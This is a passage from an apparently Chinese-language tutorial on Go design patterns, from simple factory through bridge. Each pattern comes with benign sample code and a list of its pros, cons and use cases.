class="headerlink" title="简单工厂模式（Simple Factory）"></a>简单工厂模式（Simple Factory）</h3><p>通过专门定义一个类来负责创建其他类的实例，被创建的实例通常都具有共同的父类。</p><p>在没有简单工厂模式，创建不同种类的对象的代码如下：</p><pre><code>package mainimport &quot;fmt&quot;//水果类type Fruit struct &#123;    //...    //...    //...&#125;func (f *Fruit) Show(name string) &#123;    if name == &quot;apple&quot; &#123;        fmt.Println(&quot;我是苹果&quot;)    &#125; else if name == &quot;banana&quot; &#123;        fmt.Println(&quot;我是香蕉&quot;)    &#125; else if name == &quot;pear&quot; &#123;        fmt.Println(&quot;我是梨&quot;)    &#125;&#125;//创建一个Fruit对象func NewFruit(name string) *Fruit &#123;    fruit := new(Fruit)    if name == &quot;apple&quot; &#123;        //创建apple逻辑    &#125; else if name == &quot;banana&quot; &#123;        //创建banana逻辑    &#125; else if name == &quot;pear&quot; &#123;        //创建pear逻辑    &#125;    return fruit&#125;func main() &#123;    apple := NewFruit(&quot;apple&quot;)    apple.Show(&quot;apple&quot;)    banana := NewFruit(&quot;banana&quot;)    banana.Show(&quot;banana&quot;)    pear := NewFruit(&quot;pear&quot;)    pear.Show(&quot;pear&quot;)&#125;</code></pre><p>这种实现方式存在以下问题：</p><ul><li>Fruit类中包含多个if…else模块，代码冗长维护难度大，而且大量条件判断的存在也会影响系统性能</li><li>Fruit类的职责过重，它负责初始化和显示所有的水果对象，违反了“单一职责原则”，不利于类的重用和维护</li><li>当需要增加新类型的水果时，必须修改Fruit类的构造函数和其他相关方法源代码，违反了“开闭原则”。</li></ul><p>也就是说，当业务层希望创建一个对象的时候，将直接依赖类的构造方法，这样随着类的越来越复杂，那么业务层的开发逻辑也需要依赖类的更新，且随之改变，影响开发效率和稳定性。</p><p>简单工厂模式则考虑在业务层和基础类模块中添加一个工厂模块层，降低耦合关联性。</p><p>简单工厂模式的角色和产品如下：</p><ul><li>工厂（Factory）角色：简单工厂模式的核心，它负责实现创建所有实例的内部逻辑。工厂类可以被外界直接调用，创建所需的产品对象。</li><li>抽象产品（AbstractProduct）角色：简单工厂模式所创建的所有对象的父类，它负责描述所有实例所共有的公共接口。</li><li>具体产品（Concrete Product）角色：简单工厂模式所创建的具体实例对象。</li></ul><p>简单工厂模式实现Fruit类不同对象的代码如下：</p><pre><code>package mainimport &quot;fmt&quot;// ======= 抽象层 =========//水果类(抽象接口)type Fruit interface &#123;    Show() //接口的某方法&#125;// ======= 基础类模块 =========type Apple struct &#123;    Fruit  //为了易于理解显示继承(此行可以省略)&#125;func (apple *Apple) Show() &#123;    fmt.Println(&quot;我是苹果&quot;)&#125;type Banana struct &#123;    Fruit&#125;func (banana *Banana) Show() &#123;    fmt.Println(&quot;我是香蕉&quot;)&#125;type Pear struct &#123;    Fruit&#125;func (pear *Pear) Show() &#123;    fmt.Println(&quot;我是梨&quot;)&#125;// ========= 工厂模块  =========//一个工厂， 有一个生产水果的机器，返回一个抽象水果的指针type Factory struct &#123;&#125;func (fac *Factory) CreateFruit(kind string) Fruit &#123;    var fruit Fruit    if kind == &quot;apple&quot; &#123;        fruit = new(Apple)    &#125; else if kind == &quot;banana&quot; &#123;        fruit = new(Banana)    &#125; else if kind == &quot;pear&quot; &#123;        fruit = new(Pear)    &#125;    return fruit&#125;// ==========业务逻辑层==============func main() &#123;    factory := new(Factory)    apple := factory.CreateFruit(&quot;apple&quot;)    apple.Show()    banana := factory.CreateFruit(&quot;banana&quot;)    banana.Show()    pear := factory.CreateFruit(&quot;pear&quot;)    pear.Show()&#125;</code></pre><p>简单工厂模式的优点</p><ul><li>封装对象创建：将对象的创建逻辑集中在一个工厂类中，客户端不需要知道具体的创建细节，简化了客户端代码。</li><li>减少代码重复：避免了在多个地方重复创建对象的代码，提高了代码的复用性。</li></ul><p>简单工厂模式的缺点</p><ul><li>不符合开闭原则：简单工厂模式在添加新产品时需要修改工厂类的代码，违反了开闭原则（对扩展开放，对修改关闭）。</li><li>单一职责问题：工厂类承担了过多的职责，不仅负责对象的创建，还可能涉及到对象的初始化和配置，导致类的职责过重。</li><li>难以扩展：当产品种类较多时，工厂类的代码会变得复杂，难以维护和扩展。</li><li>缺乏多态性：简单工厂模式通常返回具体的产品对象，客户端代码可能依赖于具体的产品类，缺乏多态性和灵活性。</li></ul><p>简单工厂模式的使用场景</p><ul><li>创建对象的逻辑较为简单，不需要复杂的初始化和配置。</li><li>系统中只有少量的产品类，且产品类的变化不频繁时。</li><li>客户端不关心对象的创建过程，只需要使用工厂提供的对象。</li></ul><h3 id="工厂方法模式（Factory-Method）"><a href="#工厂方法模式（Factory-Method）" class="headerlink" title="工厂方法模式（Factory Method）"></a>工厂方法模式（Factory Method）</h3><p>定义一个创建产品对象的工厂接口，将实际创建工作推迟到子类。</p><p>工厂方法模式的角色和职责</p><ul><li>抽象工厂（Abstract Factory）角色：工厂方法模式的核心，任何工厂类都必须实现这个接口。</li><li>工厂（Concrete Factory）角色：具体工厂类是抽象工厂的一个实现，负责实例化产品对象。</li><li>抽象产品（Abstract Product）角色：工厂方法模式所创建的所有对象的父类，它负责描述所有实例所共有的公共接口。</li><li>具体产品（Concrete Product）角色：工厂方法模式所创建的具体实例对象。</li></ul><pre><code>package mainimport &quot;fmt&quot;// ======= 抽象层 =========//水果类(抽象接口)type Fruit interface &#123;    Show() //接口的某方法&#125;//工厂类(抽象接口)type AbstractFactory interface &#123;    CreateFruit() Fruit //生产水果类(抽象)的生产器方法&#125;// ======= 基础类模块 =========type Apple struct &#123;    Fruit  //为了易于理解显示继承(此行可以省略)&#125;func (apple *Apple) Show() &#123;    fmt.Println(&quot;我是苹果&quot;)&#125;type Banana struct &#123;    Fruit&#125;func (banana *Banana) Show() &#123;    fmt.Println(&quot;我是香蕉&quot;)&#125;type Pear struct &#123;    Fruit&#125;func (pear *Pear) Show() &#123;    fmt.Println(&quot;我是梨&quot;)&#125;// ========= 工厂模块  =========//具体的苹果工厂type AppleFactory struct &#123;    AbstractFactory&#125;func (fac *AppleFactory) CreateFruit() Fruit &#123;    var fruit Fruit    //生产一个具体的苹果    fruit = new(Apple)    return fruit&#125;//具体的香蕉工厂type BananaFactory struct &#123;    AbstractFactory&#125;func (fac *BananaFactory) CreateFruit() Fruit &#123;    var fruit Fruit    //生产一个具体的香蕉    fruit = new(Banana)    return fruit&#125;//具体的梨工厂type PearFactory struct &#123;    AbstractFactory&#125;func (fac *PearFactory) CreateFruit() Fruit &#123;    var fruit Fruit    //生产一个具体的梨    fruit = new(Pear)    return fruit&#125;//======= 业务逻辑层 =======func main() &#123;    /*        本案例为了突出根据依赖倒转原则与面向接口编程特性。        一些变量的定义将使用显示类型声明方式    */    //需求1：需要一个具体的苹果对象    //1-先要一个具体的苹果工厂    var appleFac AbstractFactory    appleFac = new(AppleFactory)    //2-生产相对应的具体水果    var apple Fruit    apple = appleFac.CreateFruit()    apple.Show()    //需求2：需要一个具体的香蕉对象    //1-先要一个具体的香蕉工厂    var bananaFac AbstractFactory    bananaFac = new(BananaFactory)    //2-生产相对应的具体水果    var banana Fruit    banana = bananaFac.CreateFruit()    banana.Show()    //需求3：需要一个具体的梨对象    //1-先要一个具体的梨工厂    var pearFac AbstractFactory    pearFac = new(PearFactory)    //2-生产相对应的具体水果    var pear Fruit    pear = pearFac.CreateFruit()    pear.Show()&#125;</code></pre><p>工厂方法模式的优点</p><ul><li>遵循开闭原则：工厂方法模式通过引入抽象工厂和具体工厂子类，使得系统在扩展新产品类型时不需要修改已有的代码，只需添加新的工厂子类和产品类即可。</li><li>遵循单一职责原则：每个具体工厂类只负责创建一种特定类型的产品，职责单一，代码清晰，易于维护。</li><li>提高代码的灵活性和可维护性：通过引入抽象产品类或接口，工厂方法模式降低了工厂类和产品类之间的耦合度，使得代码更加灵活和可维护。</li><li>延迟对象的创建：工厂方法模式将对象的创建延迟到子类中，使得父类不需要知道具体的产品类，符合依赖倒置原则。</li></ul><p>工厂方法模式的缺点</p><ul><li>增加系统的复杂性：引入了更多的类和接口，增加了系统的复杂性，特别是在产品种类较多时，可能会导致类的数量急剧增加。</li><li>学习成本较高：对于初学者来说，理解和实现工厂方法模式可能需要一定的学习成本。</li><li>不适合创建简单对象：对于创建逻辑简单且变化不大的对象，使用工厂方法模式可能显得过于复杂，简单工厂模式可能更合适。</li></ul><p>工厂方法模式的适用场景</p><ul><li>系统需要独立于其产品创建和表示时：当一个类不知道它所需要的对象的具体类型时，可以使用工厂方法模式将对象的创建延迟到子类中。</li><li>系统需要灵活地扩展和更改产品类型时：当系统需要在不修改现有代码的情况下引入新的产品类型时，工厂方法模式是一个很好的选择。</li><li>产品的创建逻辑复杂或变化频繁时：当产品的创建逻辑较为复杂或变化频繁时，可以使用工厂方法模式将创建逻辑封装在具体工厂类中，简化客户端代码。</li><li>需要对产品的创建过程进行控制时：当需要对产品的创建过程进行精细控制，如初始化、配置等，可以使用工厂方法模式将这些逻辑封装在具体工厂类中。</li></ul><h3 id="抽象工厂模式（Abstract-Factory）"><a href="#抽象工厂模式（Abstract-Factory）" class="headerlink" title="抽象工厂模式（Abstract Factory）"></a>抽象工厂模式（Abstract Factory）</h3><p>工厂方法模式中的每个工厂只生产一类产品，可能会导致系统中存在大量的工厂类，势必会增加系统的开销。因此，可以考虑将一些相关的产品组成一个“产品族”，由同一个工厂来统一生产。抽象工厂模式提供一个创建一系列相关或相互依赖的接口，而无需指定它们具体的类。</p><p>抽象工厂模式的角色和职责为</p><ul><li>抽象工厂（Abstract Factory）角色：它声明了一组用于创建一族产品的方法，每一个方法对应一种产品。</li><li>具体工厂（Concrete Factory）角色：它实现了在抽象工厂中声明的创建产品的方法，生成一组具体产品，这些产品构成了一个产品族，每一个产品都位于某个产品等级结构中。</li><li>抽象产品（Abstract Product）角色：它为每种产品声明接口，在抽象产品中声明了产品所具有的业务方法。</li><li>具体产品（Concrete Product）角色：它定义具体工厂生产的具体产品对象，实现抽象产品接口中声明的业务方法。</li></ul><p>抽象工厂模式提到的产品族和产品模式如下</p><ul><li>产品族：具有同一个地区、同一个厂商、同一个开发包、同一个组织模块等，但是具备不同特点或功能的产品集合，称之为是一个产品族。</li><li>产品等级结构：具有相同特点或功能，但是来自不同的地区、不同的厂商、不同的开发包、不同的组织模块等的产品集合，称之为是一个产品等级结构。</li></ul><pre><code>package mainimport &quot;fmt&quot;// ======= 抽象层 =========type AbstractApple interface &#123;    ShowApple()&#125;type AbstractBanana interface &#123;    ShowBanana()&#125;type AbstractPear interface &#123;    ShowPear()&#125;//抽象工厂type AbstractFactory interface &#123;    CreateApple() AbstractApple    CreateBanana() AbstractBanana    CreatePear() AbstractPear&#125;// ======== 实现层 =========/*  中国产品族 */type ChinaApple struct &#123;&#125;func (ca *ChinaApple) ShowApple() &#123;    fmt.Println(&quot;中国苹果&quot;)&#125;type ChinaBanana struct &#123;&#125;func (cb *ChinaBanana) ShowBanana() &#123;    fmt.Println(&quot;中国香蕉&quot;)&#125;type ChinaPear struct &#123;&#125;func (cp *ChinaPear) ShowPear() &#123;    fmt.Println(&quot;中国梨&quot;)&#125;type ChinaFactory struct &#123;&#125;func (cf *ChinaFactory) CreateApple() AbstractApple &#123;    var apple AbstractApple    apple = new(ChinaApple)    return apple&#125;func (cf *ChinaFactory) CreateBanana() AbstractBanana &#123;    var banana AbstractBanana    banana = new(ChinaBanana)    return banana&#125;func (cf *ChinaFactory) CreatePear() AbstractPear &#123;    var pear AbstractPear    pear = new(ChinaPear)    return pear&#125;/*  日本产品族 */type JapanApple struct &#123;&#125;func (ja *JapanApple) ShowApple() &#123;    fmt.Println(&quot;日本苹果&quot;)&#125;type JapanBanana struct &#123;&#125;func (jb *JapanBanana) ShowBanana() &#123;    fmt.Println(&quot;日本香蕉&quot;)&#125;type JapanPear struct &#123;&#125;func (cp *JapanPear) ShowPear() &#123;    fmt.Println(&quot;日本梨&quot;)&#125;type JapanFactory struct &#123;&#125;func (jf *JapanFactory) CreateApple() AbstractApple &#123;    var apple AbstractApple    apple = new(JapanApple)    return apple&#125;func (jf *JapanFactory) CreateBanana() AbstractBanana &#123;    var banana AbstractBanana    banana = new(JapanBanana)    return banana&#125;func (cf *JapanFactory) CreatePear() AbstractPear &#123;    var pear AbstractPear    pear = new(JapanPear)    return pear&#125;/*  美国产品族 */type AmericanApple struct &#123;&#125;func (aa *AmericanApple) ShowApple() &#123;    fmt.Println(&quot;美国苹果&quot;)&#125;type AmericanBanana struct &#123;&#125;func (ab *AmericanBanana) ShowBanana() &#123;    fmt.Println(&quot;美国香蕉&quot;)&#125;type AmericanPear struct &#123;&#125;func (ap *AmericanPear) ShowPear() &#123;    fmt.Println(&quot;美国梨&quot;)&#125;type AmericanFactory struct &#123;&#125;func (af *AmericanFactory) CreateApple() AbstractApple &#123;    var apple AbstractApple    apple = new(AmericanApple)    return apple&#125;func (af *AmericanFactory) CreateBanana() AbstractBanana &#123;    var banana AbstractBanana    banana = new(AmericanBanana)    return banana&#125;func (af *AmericanFactory) CreatePear() AbstractPear &#123;    var pear AbstractPear    pear = new(AmericanPear)    return pear&#125;// ======== 业务逻辑层 =======func main() &#123;    //需求1: 需要美国的苹果、香蕉、梨 等对象    //1-创建一个美国工厂    var aFac AbstractFactory    aFac = new(AmericanFactory)    //2-生产美国苹果    var aApple AbstractApple    aApple = aFac.CreateApple()    aApple.ShowApple()    //3-生产美国香蕉    var aBanana AbstractBanana    aBanana = aFac.CreateBanana()    aBanana.ShowBanana()    //4-生产美国梨    var aPear AbstractPear    aPear = aFac.CreatePear()    aPear.ShowPear()    //需求2: 需要中国的苹果、香蕉    //1-创建一个中国工厂    cFac := new(ChinaFactory)    //2-生产中国苹果    cApple := cFac.CreateApple()    cApple.ShowApple()    //3-生产中国香蕉    cBanana := cFac.CreateBanana()    cBanana.ShowBanana()&#125;</code></pre><p>抽象工厂模式的优点</p><ul><li>分离接口和实现：抽象工厂模式通过提供一个创建对象的接口，使得客户端代码与具体的产品类解耦，符合依赖倒置原则。</li><li>提高可扩展性：当需要添加新的产品族时，只需添加新的具体工厂类和产品类，而不需要修改已有的代码，符合开闭原则。</li><li>一致的产品族创建：抽象工厂模式确保了同一产品族中的对象是一致的，避免了客户端代码中出现不兼容的产品对象。</li></ul><p>抽象工厂模式的缺点</p><ul><li>增加系统的复杂性：引入了更多的类和接口，增加了系统的复杂性，特别是在产品族较多时，可能会导致类的数量急剧增加。</li><li>难以支持新种类的产品：如果需要向产品族中添加新的产品种类，可能需要修改抽象工厂接口及其所有的具体工厂类，违反了开闭原则。</li></ul><p>抽象工厂模式的适用场景</p><ul><li>系统需要多个产品族中的产品对象时：当一个系统需要使用多个产品族中的产品对象，并且这些产品族中的对象是相互关联或依赖的，可以使用抽象工厂模式。</li><li>系统需要确保产品族中的对象的一致性时：当一个系统需要确保同一产品族中的对象是一致的，避免出现不兼容的产品对象时，可以使用抽象工厂模式。</li><li>产品等级结构稳定。设计完成之后，不会向系统中增加新的产品等级结构或者删除已有的产品等级结构。</li></ul><h3 id="原型模式（Prototype）"><a href="#原型模式（Prototype）" class="headerlink" title="原型模式（Prototype）"></a>原型模式（Prototype）</h3><p>用原型实例指定创建对象的种类，并通过拷贝这些原型创建新的对象。原型模式使对象能复制自身，并且暴露到接口中，使客户端面向接口编程时，不知道接口实际对象的情况下生成新的对象。原型模式配合原型管理器使用，使得客户端在不知道具体类的情况下，通过接口管理器得到新的实例，并且包含部分预设定配置。</p><pre><code>package prototype// Cloneable 是原型对象需要实现的接口type Cloneable interface &#123;    Clone() Cloneable&#125;type PrototypeManager struct &#123;    prototypes map[string]Cloneable&#125;func NewPrototypeManager() *PrototypeManager &#123;    return &amp;PrototypeManager&#123;        prototypes: make(map[string]Cloneable),    &#125;&#125;func (p *PrototypeManager) Get(name string) Cloneable &#123;    return p.prototypes[name].Clone()&#125;func (p *PrototypeManager) Set(name string, prototype Cloneable) &#123;    p.prototypes[name] = prototype&#125;</code></pre><p>原型模式的优点</p><ul><li>减少子类数量：通过克隆对象来创建新对象，可以减少子类的数量。</li><li>动态配置对象：可以在运行时动态地创建和配置对象。</li><li>性能优化：通过克隆对象来创建新对象，可能比通过实例化类来创建对象更高效。</li></ul><p>原型模式的缺点</p><ul><li>深拷贝和浅拷贝：实现深拷贝可能比较复杂，特别是当对象包含其他对象时。</li><li>对象状态不一致：如果原型对象的状态发生变化，可能会影响到克隆对象。</li></ul><p>原型模式的适用场景</p><ul><li>对象的创建成本较高：通过克隆现有对象来创建新对象，可以降低创建成本。</li><li>系统需要动态地创建对象：可以在运行时动态地创建和配置对象。</li></ul><h3 id="建造者模式（Builder）"><a href="#建造者模式（Builder）" class="headerlink" title="建造者模式（Builder）"></a>建造者模式（Builder）</h3><p>将一个复杂对象的构建过程与其表示分离，使得同样的构建过程可以创建不同的表示。建造者模式通过使用多个简单的对象一步一步构建一个复杂的对象。</p><pre><code>package mainimport &quot;fmt&quot;// Product 是要构建的复杂对象type Product struct &#123;    partA string    partB string    partC string&#125;// Builder 是定义了构建步骤的接口type Builder interface &#123;    BuildPartA()    BuildPartB()    BuildPartC()    GetResult() *Product&#125;// ConcreteBuilder 是具体的建造者类type ConcreteBuilder struct &#123;    product *Product&#125;func (b *ConcreteBuilder) BuildPartA() &#123;    b.product.partA = &quot;PartA&quot;&#125;func (b *ConcreteBuilder) BuildPartB() &#123;    b.product.partB = &quot;PartB&quot;&#125;func (b *ConcreteBuilder) BuildPartC() &#123;    b.product.partC = &quot;PartC&quot;&#125;func (b *ConcreteBuilder) GetResult() *Product &#123;    return b.product&#125;// Director 是指导建造过程的类type Director struct &#123;    builder Builder&#125;func (d *Director) Construct() &#123;    d.builder.BuildPartA()    d.builder.BuildPartB()    d.builder.BuildPartC()&#125;func main() &#123;    builder := &amp;ConcreteBuilder&#123;product: &amp;Product&#123;&#125;&#125;    director := &amp;Director&#123;builder: builder&#125;    director.Construct()    product := builder.GetResult()    fmt.Println(&quot;Product:&quot;, product.partA, product.partB, product.partC)&#125;</code></pre><p>建造者模式的优点</p><ul><li>分离构建过程和表示：将对象的构建过程与其表示分离，使得同样的构建过程可以创建不同的表示。</li><li>更好的控制：可以更好地控制对象的构建过程。</li><li>代码复用：可以复用构建过程中的代码。</li></ul><p>建造模式的缺点</p><ul><li>增加复杂性：引入建造者模式会增加系统的复杂性，因为需要额外的建造者类。</li><li>不适合简单对象：对于简单对象，使用建造者模式可能会显得过于复杂。</li></ul><p>建造模式的适用场景</p><ul><li>复杂对象的创建：需要创建一个由多个部分组成的复杂对象。</li><li>不同表示的对象：需要通过同样的构建过程创建不同表示的对象。</li></ul><h2 id="结构型模式"><a href="#结构型模式" class="headerlink" title="结构型模式"></a>结构型模式</h2><h3 id="代理模式（Proxy）"><a href="#代理模式（Proxy）" class="headerlink" title="代理模式（Proxy）"></a>代理模式（Proxy）</h3><p>在不改变原始对象的情况下，通过代理对象来控制对原始对象的访问。</p><pre><code>package mainimport &quot;fmt&quot;// Subject 是定义了 RealSubject 和 Proxy 的共同接口type Subject interface &#123;    Request() string&#125;// RealSubject 是我们要访问的真实对象type RealSubject struct&#123;&#125;func (r *RealSubject) Request() string &#123;    return &quot;RealSubject: Handling request.&quot;&#125;// Proxy 是代理类，控制对 RealSubject 的访问type Proxy struct &#123;    realSubject *RealSubject&#125;func (p *Proxy) Request() string &#123;    if p.realSubject == nil &#123;        p.realSubject = &amp;RealSubject&#123;&#125;    &#125;    // 在调用真实对象的方法之前，可以添加额外的功能    fmt.Println(&quot;Proxy: Logging the request.&quot;)    return p.realSubject.Request()&#125;func main() &#123;    var subject Subject = &amp;Proxy&#123;&#125;    fmt.Println(subject.Request())&#125;</code></pre><p>代理模式的优点</p><ul><li>控制访问：代理模式可以控制对原始对象的访问。例如，保护代理可以在访问原始对象之前进行权限检查。</li></ul><p>代理模式的缺点</p><ul><li>增加复杂性：引入代理模式会增加系统的复杂性，因为需要额外的代理类。</li><li>性能开销：代理模式可能会增加系统的性能开销，特别是在代理中添加了额外的处理逻辑时。</li><li>潜在的过度设计</li></ul><p>代理模式的适用场景</p><ul><li>远程代理：为一个位于不同地址空间的对象提供局部代表。典型的例子是RMI（远程方法调用）。</li><li>虚拟代理：根据需要创建开销很大的对象。典型的例子是按需加载的图像。</li><li>保护代理：控制对原始对象的访问。典型的例子是权限控制。</li><li>智能引用：在访问对象时执行一些附加操作。典型的例子是引用计数、日志记录等。</li></ul><h3 id="装饰模式（Decorator）"><a href="#装饰模式（Decorator）" class="headerlink" title="装饰模式（Decorator）"></a>装饰模式（Decorator）</h3><p>动态地给一个对象增加一些额外的职责，就增加对象功能来说，装饰模式比生成子类实现更为灵活，它允许向一个现有的对象添加新的功能，同时又不改变其结构，其通过创建一个装饰类来包装原始类，从而在保持类接口不变的情况下增强类的功能。装饰模式是一种对象结构型模式。</p><p>装饰模式的角色和职责</p><ul><li>Component（抽象构件）：它是具体构件和抽象装饰类的共同父类，声明了在具体构件中实现的业务方法，它的引入可以使客户端以一致的方式处理未被装饰的对象以及装饰之后的对象，实现客户端的透明操作。</li><li>ConcreteComponent（具体构件）：它是抽象构件类的子类，用于定义具体的构件对象，实现了在抽象构件中声明的方法，装饰器可以给它增加额外的职责（方法）</li></ul><pre><code>package mainimport &quot;fmt&quot;// Component 是定义了基本操作的接口type Component interface &#123;    Operation() string&#125;// ConcreteComponent 是具体的组件类，实现了 Component 接口type ConcreteComponent struct&#123;&#125;func (c *ConcreteComponent) Operation() string &#123;    return &quot;ConcreteComponent&quot;&#125;// Decorator 是装饰器类，实现了 Component 接口，并包含一个 Component 类型的字段type Decorator struct &#123;    component Component&#125;func (d *Decorator) Operation() string &#123;    return d.component.Operation()&#125;// ConcreteDecoratorA 是具体的装饰器类，扩展了 Decorator 类type ConcreteDecoratorA struct &#123;    Decorator&#125;func (d *ConcreteDecoratorA) Operation() string &#123;    return fmt.Sprintf(&quot;ConcreteDecoratorA(%s)&quot;, d.component.Operation())&#125;// ConcreteDecoratorB 是另一个具体的装饰器类，扩展了 Decorator 类type ConcreteDecoratorB struct &#123;    Decorator&#125;func (d *ConcreteDecoratorB) Operation() string &#123;    return fmt.Sprintf(&quot;ConcreteDecoratorB(%s)&quot;, d.component.Operation())&#125;func main() &#123;    // 创建具体的组件对象    component := &amp;ConcreteComponent&#123;&#125;    // 使用装饰器A装饰组件    decoratorA := &amp;ConcreteDecoratorA&#123;Decorator&#123;component: component&#125;&#125;    fmt.Println(decoratorA.Operation())    // 使用装饰器B装饰组件    decoratorB := &amp;ConcreteDecoratorB&#123;Decorator&#123;component: component&#125;&#125;    fmt.Println(decoratorB.Operation())    // 使用装饰器A和装饰器B组合装饰组件    decoratorAB := &amp;ConcreteDecoratorA&#123;Decorator&#123;component: decoratorB&#125;&#125;    fmt.Println(decoratorAB.Operation())&#125;</code></pre><p>装饰模式的优点</p><ul><li>灵活性：可以在运行时动态地添加或删除对象的功能。</li><li>遵循开闭原则：可以在不修改现有类的情况下扩展对象的功能。</li><li>组合功能：可以通过多个装饰器类的组合来实现复杂的功能。</li></ul><p>装饰模式的缺点</p><ul><li>增加复杂性：引入装饰模式会增加系统的复杂性，因为需要额外的装饰类。</li><li>多层装饰：如果装饰器类过多，会导致系统变得复杂且难以调试。</li></ul><p>装饰模式的适用场景</p><ul><li>需要扩展类的功能：在不修改现有类的情况下，动态地添加或删除类的功能。</li><li>需要组合功能：通过多个装饰器类的组合来实现复杂的功能。</li></ul><h3 id="适配器模式（Adapter）"><a href="#适配器模式（Adapter）" class="headerlink" title="适配器模式（Adapter）"></a>适配器模式（Adapter）</h3><p>将一个类的接口转换成客户希望的另一个接口，使得原本由于接口不兼容而不能一起工作的类可以一起工作。适配器模式可以分为类适配器和对象适配器两种。</p><p>适配器模式的角色和职责</p><ul><li>Target（目标抽象类）：目标抽象类定义客户所需接口，可以是一个抽象类或接口，也可以是具体类。</li><li>Adapter（适配器类）：适配器可以调用另一个接口，作为一个转换器，对Adaptee和Target进行适配，适配器类是适配器模式的核心，在对象适配器中，它通过继承Target并关联一个Adaptee对象使二者产生联系。</li><li>Adaptee（适配者类）：适配者即被适配的角色，它定义了一个已经存在的接口，这个接口需要适配，适配者类一般是一个具体类，包含了客户希望使用的业务方法，在某些情况下可能没有适配者类的源代码。</li></ul><pre><code>package mainimport &quot;fmt&quot;// Target 是客户期望的接口type Target interface &#123;    Request() string&#125;// Adaptee 是需要适配的类type Adaptee struct&#123;&#125;func (a *Adaptee) SpecificRequest() string &#123;    return &quot;Adaptee&#39;s specific request&quot;&#125;// Adapter 是将 Adaptee 转换为 Target 接口的适配器type Adapter struct &#123;    adaptee *Adaptee&#125;func (a *Adapter) Request() string &#123;    return a.adaptee.SpecificRequest()&#125;func main() &#123;    adaptee := &amp;Adaptee&#123;&#125;    adapter := &amp;Adapter&#123;adaptee: adaptee&#125;    fmt.Println(adapter.Request())&#125;</code></pre><p>适配器模式的优点</p><ul><li>提高类的复用性：通过适配器模式，可以将现有的类复用到新的环境中。</li><li>提高类的灵活性：通过适配器模式，可以在不修改现有代码的情况下，使用新的接口。</li><li>解耦：适配器模式可以将客户端与具体实现解耦，使得代码更加灵活和可维护。</li></ul><p>适配器模式的缺点</p><ul><li>增加系统复杂性：引入适配器模式会增加系统的复杂性，因为需要额外的适配器类。</li><li>性能开销：适配器模式可能会增加系统的性能开销，特别是在适配器中添加了额外的处理逻辑时。</li></ul><p>适配器模式的应用场景</p><ul><li>接口不兼容：想使用一个已经存在的类，但它的接口不符合需求时，可以使用适配器模式。</li><li>复用现有类：想复用一些现有的类，但这些类的接口与目标接口不兼容时，可以使用适配器模式。</li></ul><h3 id="外观模式（Facade）"><a href="#外观模式（Facade）" class="headerlink" title="外观模式（Facade）"></a>外观模式（Facade）</h3><p>为子系统中的一组接口提供一个一致的界面。外观模式定义了一个高层接口，这个接口使得这一子系统更加容易使用。</p><p>外观模式的角色和职责</p><ul><li>Façade(外观角色)：为调用方, 定义简单的调用接口。</li><li>SubSystem(子系统角色)：功能提供者。指提供功能的类群（模块或子系统）。</li></ul><pre><code>package mainimport &quot;fmt&quot;// 子系统Atype SubsystemA struct&#123;&#125;func (s *SubsystemA) OperationA() &#123;    fmt.Println(&quot;SubsystemA: OperationA&quot;)&#125;// 子系统Btype SubsystemB struct&#123;&#125;func (s *SubsystemB) OperationB() &#123;    fmt.Println(&quot;SubsystemB: OperationB&quot;)&#125;// 子系统Ctype SubsystemC struct&#123;&#125;func (s *SubsystemC) OperationC() &#123;    fmt.Println(&quot;SubsystemC: OperationC&quot;)&#125;// Facade 是外观类，提供了一个简单的接口来访问子系统type Facade struct &#123;    subsystemA *SubsystemA    subsystemB *SubsystemB    subsystemC *SubsystemC&#125;func NewFacade() *Facade &#123;    return &amp;Facade&#123;        subsystemA: &amp;SubsystemA&#123;&#125;,        subsystemB: &amp;SubsystemB&#123;&#125;,        subsystemC: &amp;SubsystemC&#123;&#125;,    &#125;&#125;func (f *Facade) Operation() &#123;    fmt.Println(&quot;Facade: Operation&quot;)    f.subsystemA.OperationA()    f.subsystemB.OperationB()    f.subsystemC.OperationC()&#125;func main() &#123;    facade := NewFacade()    facade.Operation()&#125;</code></pre><p>外观模式的优点</p><ul><li>简化接口：外观模式提供了一个简单的接口，简化了客户端与复杂系统之间的交互。</li><li>松散耦合：外观模式将客户端与子系统解耦，客户端不需要了解子系统的内部细节。</li><li>更好的分层：外观模式可以帮助分层系统中的各个子系统之间的交互。</li></ul><p>外观模式的缺点</p><ul><li>不完全封装：外观模式并不能完全封装子系统，客户端仍然可以直接访问子系统的类。</li></ul><p>外观模式的适用场景</p><ul><li>简化复杂系统的使用：外观模式可以为复杂系统提供一个简单的接口，使得客户端更容易使用。</li><li>分层系统：在分层系统中，外观模式可以帮助分离各个子系统，使得它们之间的交互更加清晰。</li></ul><h3 id="桥接模式（Bridge）"><a href="#桥接模式（Bridge）" class="headerlink" title="桥接模式（Bridge）"></a>桥接模式（Bridge）</h3><p>将抽象部分与它的实现部分分离，使它们都可以独立地变化。桥接模式的核心思想是将继承关系转化为组合关系，从而减少类之间的耦合度。</p><pre><code>package mainimport &quot;fmt&quot;// Implementor 是实现部分的接口type Implementor interface &#123;    OperationImpl() string&#125;// ConcreteImplementorA 是实现部分的具体实现Atype ConcreteImplementorA struct&#123;&#125;func (c *ConcreteImplementorA) OperationImpl() string &#123;    return &quot;ConcreteImplementorA: OperationImpl&quot;&#125;// ConcreteImplementorB 是实现部分的具体实现Btype ConcreteImplementorB struct&#123;&#125;func (c *ConcreteImplementorB) OperationImpl() string &#123;    return &quot;ConcreteImplementorB: OperationImpl&quot;&#125;// Abstraction 是抽象部分的接口type Abstraction interface &#123;    Operation() string&#125;// RefinedAbstraction 是抽象部分的具体实现type RefinedAbstraction struct &#123;    implementor Implementor&#125;func (r *RefinedAbstraction) Operation() string &#123;    return r.implementor.OperationImpl()&#125;func main() &#123;    implementorA := &amp;ConcreteImplementorA&#123;&#125;    implementorB := &amp;ConcreteImplementorB&#123;&#125;    abstractionA := &amp;RefinedAbstraction&#123;implementor: implementorA&#125;    abstractionB := &amp;RefinedAbstraction&#123;implementor: implementorB&#125;    fmt.Println(abstractionA.Operation())    